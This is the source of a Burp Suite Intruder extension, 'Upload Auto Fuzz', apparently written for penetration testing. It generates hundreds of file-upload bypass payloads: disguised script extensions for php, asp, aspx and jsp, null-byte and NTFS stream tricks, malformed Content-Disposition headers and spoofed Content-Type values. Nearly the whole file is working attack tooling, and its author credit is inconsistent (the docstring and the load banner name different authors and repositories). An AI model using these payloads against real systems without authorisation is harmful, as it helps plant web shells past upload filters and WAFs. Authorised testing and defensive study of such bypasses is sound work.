# -*- coding: utf-8 -*-
"""
Upload Auto Fuzz - Burp Suite Extension
=======================================

A comprehensive file upload vulnerability fuzzing tool for Burp Suite.
Supports various bypass techniques for WAF, content-type, and file extension restrictions.

Author: Maikefee
Version: 1.1.0
Github: https://github.com/Maikefee/Upload_Auto_Fuzz_Burp_Plugin
"""

from burp import IBurpExtender
from burp import IIntruderPayloadGeneratorFactory
from burp import IIntruderPayloadGenerator
import random
from urllib import unquote
import re
import time


def getAttackPayloads(template):
    """
    生成文件上传绕过攻击的payload列表
    
    Args:
        template (str): 原始HTTP请求模板
        
    Returns:
        list: 包含所有绕过payload的列表
    """
    # 获取文件扩展名
    filename_suffix = re.search(r'filename=".*[.](.*)"', template).group(1)
    content_type = template.split('\n')[-1]

    def generate_script_suffix_payloads():
        """生成文件后缀绕过payload"""
        # 定义各种文件后缀绕过方式
        asp_bypasses = [
            'asp;.jpg', 'asp.jpg', 'asp;jpg', 'asp/1.jpg', 
            'asp{}.jpg'.format(unquote('%00')), 'asp .jpg',
            'asp_.jpg', 'asa', 'cer', 'cdx', 'ashx', 'asmx', 
            'xml', 'htr', 'asax', 'asaspp', 'asp;+2.jpg'
        ]
        
        aspx_bypasses = [
            'asPx', 'aspx .jpg', 'aspx_.jpg', 'aspx;+2.jpg', 'asaspxpx'
        ]
        
        php_bypasses = [
            'php1', 'php2', 'php3', 'php4', 'php5', 'pHp', 
            'php .jpg', 'php_.jpg', 'php.jpg', 'php.  .jpg',
            'jpg/.php', 'php.123', 'jpg/php', 'jpg/1.php', 
            'jpg{}.php'.format(unquote('%00')),
            'php{}.jpg'.format(unquote('%00')),
            'php:1.jpg', 'php::$DATA', 'php::$DATA......', 'ph\np'
        ]
        
        jsp_bypasses = [
            '.jsp.jpg.jsp', 'jspa', 'jsps', 'jspx', 'jspf', 
            'jsp .jpg', 'jsp_.jpg'
        ]
        
        # 新增更多后缀绕过方式
        asp_advanced_bypasses = [
            'asp.', 'asp;', 'asp,', 'asp:', 'asp%20', 'asp%00', 
            'asp%0a', 'asp%0d%0a', 'asp%0d', 'asp%0a%0d', 
            'asp%09', 'asp%0b', 'asp%0c', 'asp%0e', 'asp%0f', 
            'asp.jpg.asp', 'asp.jpg.asp.jpg', 'asp.asp.jpg', 
            'asp.jpg.123', 'asp.jpg...', 'asp.jpg/', 'asp.jpg\\', 
            'asp.jpg::$DATA'
        ]
        
        php_advanced_bypasses = [
            'php.', 'php;', 'php,', 'php:', 'php%20', 'php%00', 
            'phtml', 'pht', 'phpt', 'php7', 'php8', 'phar', 'pgif', 
            'php.jpg.php', 'php.jpg.php.jpg', 'php.php.jpg', 
            'php.jpg.123', 'php.jpg...', 'php.jpg/', 'php.jpg\\'
        ]
        
        # 合并所有后缀绕过方式
        all_suffix_bypasses = (
            asp_bypasses + aspx_bypasses + php_bypasses + jsp_bypasses + 
            asp_advanced_bypasses + php_advanced_bypasses
        )

        suffix_payloads = []
        for bypass_suffix in all_suffix_bypasses:
            temp_template = template.replace(filename_suffix, bypass_suffix)
            suffix_payloads.append(temp_template)

        return suffix_payloads

    def generate_content_disposition_payloads():
        """生成Content-Disposition绕过payload"""
        target_suffixes = ['php', 'asp', 'aspx', 'jsp']
        content_disposition_payloads = []

        for suffix in target_suffixes:
            temp_template = template.replace(filename_suffix, suffix)
            filename_pattern = re.search(r'(filename=".*")', temp_template).group(1)
            
            # 基础绕过
            content_disposition_payloads.append(temp_template)
            
            # 大小写变化
            content_disposition_payloads.append(
                temp_template.replace('Content-Disposition', 'content-Disposition')
            )
            
            # 空格变化
            content_disposition_payloads.append(
                temp_template.replace('Content-Disposition: ', 'content-Disposition:')
            )
            content_disposition_payloads.append(
                temp_template.replace('Content-Disposition: ', 'content-Disposition:  ')
            )
            
            # form-data变化
            content_disposition_payloads.append(
                temp_template.replace('form-data', '~form-data')
            )
            content_disposition_payloads.append(
                temp_template.replace('form-data', 'f+orm-data')
            )
            content_disposition_payloads.append(
                temp_template.replace('form-data', '*')
            )
            
            # 分号后空格变化
            content_disposition_payloads.append(
                temp_template.replace('form-data; ', 'form-data;  ')
            )
            content_disposition_payloads.append(
                temp_template.replace('form-data; ', 'form-data;')
            )
            
            # 等号绕过
            content_disposition_payloads.append(
                temp_template.replace(filename_pattern, 
                                   'filename===zc.{}'.format(suffix))
            )
            content_disposition_payloads.append(
                temp_template.replace(filename_pattern, 
                                   'filename==="zc.{}'.format(suffix))
            )
            content_disposition_payloads.append(
                temp_template.replace(filename_pattern, 
                                   'filename==="zc.{}"'.format(suffix))
            )
            
            # 回车绕过
            content_disposition_payloads.append(
                temp_template.replace(filename_pattern, 
                                   'filename="zc.{}\n"'.format(suffix))
            )
            content_disposition_payloads.append(
                temp_template.replace(filename_pattern, 
                                   '\nfilename==="zc.\n{}"'.format(suffix))
            )
            content_disposition_payloads.append(
                temp_template.replace(filename_pattern, 
                                   'filename="zc.\nC.{}"'.format(suffix))
            )
            
            # 换行绕过
            content_disposition_payloads.append(
                temp_template.replace(filename_pattern, 
                                   'filename\n="zc.{}"'.format(suffix))
            )
            
            # 反斜杠绕过
            content_disposition_payloads.append(
                temp_template.replace(filename_pattern, 
                                   'filename="zc\.{}"'.format(suffix))
            )
            
            # 超长文件名绕过
            long_filename = 'z' * 200 + '.{}'.format(suffix)
            content_disposition_payloads.append(
                temp_template.replace(filename_pattern, 
                                   'filename="{}"'.format(long_filename))
            )
            
            # 超长分隔符绕过
            content_disposition_payloads.append(
                temp_template.replace('form-data', '-' * 200)
            )
            
            # 双参数绕过
            content_disposition_payloads.append(
                temp_template.replace(filename_pattern, 
                                   'filename="zc.jpg";filename="zc.{}"'.format(suffix))
            )
            
            # 双扩展名绕过
            content_disposition_payloads.append(
                temp_template.replace(filename_pattern, 
                                   'filename="zc.{}.jpg"'.format(suffix))
            )
            content_disposition_payloads.append(
                temp_template.replace(filename_pattern, 
                                   'filename="zc.jpg.{}"'.format(suffix))
            )

        return content_disposition_payloads

    def generate_content_type_payloads():
        """生成Content-Type绕过payload"""
        target_suffixes = ['asp', 'aspx', 'php', 'jsp']
        content_type_payloads = []

        for suffix in target_suffixes:
            temp_template = template.replace(filename_suffix, suffix)
            TEMP_TEMPLATE_CONTENT_TYPE = temp_template
            content_type_payloads.append(
                TEMP_TEMPLATE_CONTENT_TYPE.replace(content_type, 'Content-Type: image/gif'))
            content_type_payloads.append(
                TEMP_TEMPLATE_CONTENT_TYPE.replace(content_type, 'Content-Type: image/jpeg'))
            content_type_payloads.append(
                TEMP_TEMPLATE_CONTENT_TYPE.replace(content_type, 'Content-Type: application/php'))
            content_type_payloads.append(
                TEMP_TEMPLATE_CONTENT_TYPE.replace(content_type, 'Content-Type: text/plain'))
            content_type_payloads.append(TEMP_TEMPLATE_CONTENT_TYPE.replace('Content-Type', 'content-type'))
            content_type_payloads.append(
                TEMP_TEMPLATE_CONTENT_TYPE.replace('Content-Type: ', 'Content-Type:  '))
            
            # 新增Content-Type绕过方式
            content_type_payloads.append(
                TEMP_TEMPLATE_CONTENT_TYPE.replace(content_type, 'Content-Type: image/png'))
            
            content_type_payloads.append(
                TEMP_TEMPLATE_CONTENT_TYPE.replace(content_type, 'Content-Type: application/octet-stream'))
            
            content_type_payloads.append(
                TEMP_TEMPLATE_CONTENT_TYPE.replace(content_type, 'Content-Type: multipart/form-data'))
            
            content_type_payloads.append(
                TEMP_TEMPLATE_CONTENT_TYPE.replace(content_type, 'Content-Type: application/x-httpd-php'))
            
            content_type_payloads.append(
                TEMP_TEMPLATE_CONTENT_TYPE.replace(content_type, 'Content-Type: application/x-asp'))

        return content_type_payloads

    # 调用所有Fuzz函数并合并结果
    suffix_payloads = generate_script_suffix_payloads()
    content_disposition_payloads = generate_content_disposition_payloads()
    content_type_payloads = generate_content_type_payloads()

    # 合并所有payload
    attackPayloads = (suffix_payloads + content_disposition_payloads + content_type_payloads)
    
    # 去除重复的payload
    unique_payloads = []
    seen_payloads = set()
    
    for payload in attackPayloads:
        # 使用payload的字符串表示来判断是否重复
        payload_str = str(payload)
        if payload_str not in seen_payloads:
            seen_payloads.add(payload_str)
            unique_payloads.append(payload)
    
    print "Total unique payloads: %d" % len(unique_payloads)
    return unique_payloads


class BurpExtender(IBurpExtender, IIntruderPayloadGeneratorFactory):
    """
    Burp Suite扩展主类
    实现文件上传漏洞的自动化fuzz测试
    """
    
    def registerExtenderCallbacks(self, callbacks):
        """注册扩展回调"""
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("Upload_Auto_Fuzz 1.1.0")
        
        # 注册payload生成器
        callbacks.registerIntruderPayloadGeneratorFactory(self)
        
        # 打印加载信息
        print '==================================='
        print '[ UAF Load successful ]'
        print '[#]  Author: T3nk0'
        print '[#]  Github: https://github.com/T3nk0/Upload_Auto_Fuzz'
        print '[#]  Version: 1.1.0'
        print '===================================\n'

    def getGeneratorName(self):
        """设置payload生成器名字，作为选项显示在Intruder UI中"""
        return "Upload_Auto_Fuzz"

    def createNewInstance(self, attack):
        """创建payload生成器实例，传入的attack是IIntruderAttack的实例"""
        return demoFuzzer(self, attack)


class demoFuzzer(IIntruderPayloadGenerator):
    """
    文件上传fuzz测试器
    继承IIntruderPayloadGenerator类，实现具体的payload生成逻辑
    """
    
    def __init__(self, extender, attack):
        """初始化fuzzer"""
        self._extender = extender
        self._helpers = extender._helpers
        self._attack = attack
        self.num_payloads = 0  # payload使用了的次数
        self._payloadIndex = 0
        self.attackPayloads = [1]  # 初始化为非空列表，保持原始代码的方式

    def hasMorePayloads(self):
        """
        检查是否还有更多payload
        返回一个bool值，如果返回false就不在继续返回下一个payload，如果返回true就返回下一个payload
        """
        return self._payloadIndex < len(self.attackPayloads)

    def getNextPayload(self, baseValue):
        """
        获取下一个payload，然后intruder就会用该payload发送请求
        
        Args:
            baseValue: 用户选中的基础值
            
        Returns:
            str: 生成的payload
        """
        # 将baseValue转换为字符串
        selected_area = "".join(chr(x) for x in baseValue)
        
        if self._payloadIndex == 0:
            # 使用原来的方法生成payload
            self.attackPayloads = getAttackPayloads(selected_area)
            
            # 去除重复的payload (更可靠的方法)
            unique_payloads = []
            seen_payloads = set()
            
            for payload in self.attackPayloads:
                # 使用payload的哈希值来判断是否重复
                payload_hash = hash(str(payload))
                if payload_hash not in seen_payloads:
                    seen_payloads.add(payload_hash)
                    unique_payloads.append(payload)
            
            self.attackPayloads = unique_payloads
            
            # 限制payload数量防止内存溢出
            if len(self.attackPayloads) > 1000:
                self.attackPayloads = self.attackPayloads[:1000]
            print "Generated %d unique payloads" % len(self.attackPayloads)

        payload = self.attackPayloads[self._payloadIndex]
        self._payloadIndex = self._payloadIndex + 1

        return payload

    def reset(self):
        """清空，以便下一次调用 getNextPayload()再次返回第一个有效负载"""
        self._payloadIndex = 0
        return 